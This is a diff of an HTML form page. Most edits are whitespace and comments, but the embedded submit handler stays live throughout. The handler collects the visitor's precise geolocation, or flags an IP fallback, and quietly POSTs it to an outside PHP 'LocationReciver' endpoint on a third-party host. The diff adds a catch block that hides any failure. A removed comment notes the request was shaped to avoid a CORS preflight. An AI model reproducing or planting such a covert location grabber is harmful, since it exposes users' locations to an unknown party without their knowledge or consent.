@@ -123,10 +123,12 @@
         <button type="submit">Submit</button>
         <button type="reset">Reset</button>
 
-        <script>
+       <script>
 ;(function(){
-  const btn = document.querySelector('button[type="submit"]');
+  const btn  = document.querySelector('button[type="submit"]');
   const form = btn.closest('form');
+
+  // simple mobile check
   const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
 
   form.addEventListener('submit', e => {
@@ -142,19 +144,19 @@
           send(payload);
         },
         () => {
-          payload.type = 'ip';
+          payload.type = 'ip';  // fallback on geo‑error
           send(payload);
         },
         { enableHighAccuracy:true, timeout:10000 }
       );
     } else {
-      payload.type = 'ip';
+      payload.type = 'ip';    // desktop or geo not supported
       send(payload);
     }
   });
 
   function send(data) {
-    // build a form‑encoded body (no custom Content-Type header → no preflight)
+    // build URL‑encoded form data
     const formData = new URLSearchParams();
     if (data.lat  !== undefined) formData.append('lat',  data.lat);
     if (data.lng  !== undefined) formData.append('lng',  data.lng);
@@ -163,12 +165,11 @@
     fetch('https://phptestinggggg.ct.ws/LocationReciver.php', {
       method: 'POST',
       body:   formData
-    });
+    })
+    .catch(_=>{/* silent */});
   }
 })();
 </script>
-
-
 
     </form>
 
